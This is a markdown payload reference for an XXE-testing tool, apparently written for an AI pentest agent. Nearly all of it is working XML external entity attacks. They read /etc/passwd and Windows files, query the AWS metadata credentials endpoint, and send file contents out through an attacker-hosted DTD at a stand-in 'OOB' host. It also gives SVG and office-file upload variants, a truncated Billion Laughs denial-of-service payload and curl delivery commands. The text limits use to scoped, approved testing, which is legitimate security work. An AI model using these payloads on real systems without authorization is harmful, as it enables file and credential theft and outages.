# payloads — xxe-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Completo de Segurança e Testes em Ataques XXE.md` (Section 5: PAYLOADS / PROBES)

All probes target an application's XML parser. Use the shortest probe that
produces a clear signal. Do NOT send the DoS / Billion-Laughs payloads
without explicit `destructive_testing: approved` in `security-scope.yaml`.

---

## Detection — Is DTD Processing Enabled?

Minimal probe. If the parser returns the entity value inside the response,
DTD processing is on.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe "XXE_PROBE_STRING"> ]>
<root>&xxe;</root>
```

Expected response contains `XXE_PROBE_STRING` where `<root>` text would
normally appear.

---

## Classic In-Band File Disclosure

Read a local file and reflect it in the response (works when the parsed
XML value is echoed).

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

### Windows variant

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root>&xxe;</root>
```

### Base64-wrapped read (handles binary / invalid-XML content)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

The `php://filter` wrapper is PHP-specific and returns the file content
base64-encoded; useful when the file contains `<` or `&` that would break
the XML parser.

---

## SSRF via Entity URL

Use the entity to force the server to make an outbound HTTP request.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
<root>&xxe;</root>
```

### Cloud metadata probe (AWS IMDSv1)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

If the server returns credentials in the response, escalate to
`ssrf-cloud-metadata-hunter`.

---

## Blind / Out-of-Band (OOB) Exfiltration

When the application does not reflect parsed XML content, exfiltrate
file content via an attacker-controlled external DTD.

### Step 1 — Host this DTD at `http://OOB/evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OOB/log?data=%file;'>">
%eval;
%exfil;
```

### Step 2 — Send this XML to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://OOB/evil.dtd"> %remote; ]>
<root>test</root>
```

The OOB listener logs the file contents as URL parameters.

### Error-based Blind (no outbound HTTP required)

If the target can fetch the remote DTD but OOB HTTP exfiltration is
filtered, force a parser error that echoes the file content:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The resulting `java.io.FileNotFoundException` (or equivalent) will contain
the contents of `/etc/passwd` in the error path message.

---

## XInclude

Use when user-supplied XML is inserted into a larger server-side document
(no control over the prolog / DTD).

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd" />
</foo>
```

XInclude bypasses DTD restrictions — the application must explicitly
disable XInclude processing.

---

## SOAP-Specific

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
    <op><arg>&xxe;</arg></op>
  </soap:Body>
</soap:Envelope>
```

---

## File Upload Vectors (Hidden XML)

XML parsers lurk inside office-document formats. An XXE payload inside
any of these files is treated as ordinary XML once the container is
unzipped server-side:

- `.docx`, `.xlsx`, `.pptx` (OOXML — see `word/document.xml`)
- `.odt`, `.ods` (OpenDocument — see `content.xml`)
- `.svg` (reaches XML parser directly — try the classic payload above)
- `.xml.gz`, `.xml.zip` (compressed XML)
- `.pdf` (XFA forms often parse XML)

Generate a minimal `.svg` probe:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
  <text y="40">&xxe;</text>
</svg>
```

Upload the SVG to an avatar-upload / image-ingest endpoint; view the
server-rendered version to see if the entity was resolved.

---

## Parameter Entity Tricks

Declare a parameter entity that expands inside another entity declaration.
Works when general entities are blocked but parameter entities are not.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % param1 "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %param1;
]>
<root>&xxe;</root>
```

---

## Gated: Denial-of-Service (Billion Laughs)

Expands an entity into trillions of bytes, exhausting server memory.
**Requires `destructive_testing: approved`** — do not send unprompted.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- further expansion levels omitted; add only with scope approval -->
]>
<lolz>&lol3;</lolz>
```

---

## Trigger Expected Errors (Parser Identification)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "">]>
<root>&xxe;</root>
```

An error message frequently reveals the parser (libxml2, Xerces,
MSXML6, etc.) — useful for tuning subsequent probes.

---

## Command Reference

```bash
# Send a classic XXE probe with curl
curl -X POST "https://target/api/xml-endpoint" \
     -H "Content-Type: application/xml" \
     --data-binary @classic_probe.xml

# Host a remote DTD for blind testing
python3 -m http.server 8000 --directory ./oob-dtds
```

Record every test in `07b_PENTEST_REPORT.md` with the exact payload,
response snippet (first 200 chars), and whether the probe succeeded,
failed, or was blocked.
